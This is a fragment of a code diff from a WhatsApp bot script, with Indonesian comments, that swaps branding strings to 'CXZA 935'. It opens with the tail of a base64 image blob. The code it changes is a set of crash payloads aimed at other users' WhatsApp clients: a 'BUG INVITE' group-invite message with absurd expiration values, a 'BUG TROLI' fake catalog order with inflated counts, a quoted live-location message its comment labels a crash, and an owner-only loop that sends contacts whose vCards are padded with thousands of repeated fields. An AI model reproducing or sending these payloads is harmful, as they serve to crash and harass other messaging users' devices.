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"
 }
@@ -5071,9 +5041,9 @@ pc = generateWAMessageFromContent(m.chat,{
 "inviteCode": "CZ/GAeOhayYnqjcK", //Jan di ubh
 "inviteExpiration": "99999999999",
 "invitetime": "9999999999999999",
-"groupName": `CXZA 935 ${philips}️️`,
-"jpegThumbnail": fs.readFileSync(`./pict.jpg`),//FIXED CXZA 935 MD
-"caption": `BUG INVITE CXZA 935\n\n${philips}`,
+"groupName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${philips}️️`,
+"jpegThumbnail": fs.readFileSync(`./pict.jpg`),//FIXED © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 MD
+"caption": `BUG INVITE © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓\n\n${philips}`,
 "contextInfo": {
 "forwardingScore": 150,
 "isForwarded": true
@@ -5085,7 +5055,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
 liveLocationMessage: {
-caption: `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+caption: `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
@@ -5106,8 +5076,8 @@ let troli = generateWAMessageFromContent(m.chat,{
 "itemCount": 2030,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"orderTitle": "BY CXZA 935",
-"message":"CXZA 935",
+"orderTitle": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓",
+"message":"© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓",
 "sellerJid": "5491133536405@s.whatsapp.net",
 "token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
 "totalAmount1000": "IDR 99.99999999999999999999",
@@ -5145,7 +5115,7 @@ let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {
 	"itemCount": 2030,
 	"status": "INQUIRY",
 	"surface": "CATALOG",
-	"message": " 🎭 CXZA 935 🎭",
+	"message": " 🎭 © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 🎭",
 	"orderTitle": " BUG TROLI ", // 
 	"sellerJid": "6283131458282@s.whatsapp.net",
 	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
@@ -5177,7 +5147,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `BY CXZA 935${philips}`,
+"fileName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${philips}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 	}
 }
@@ -5190,7 +5160,7 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (args.length == 0) return m.reply(`Jumlah?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:CXZA 935\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 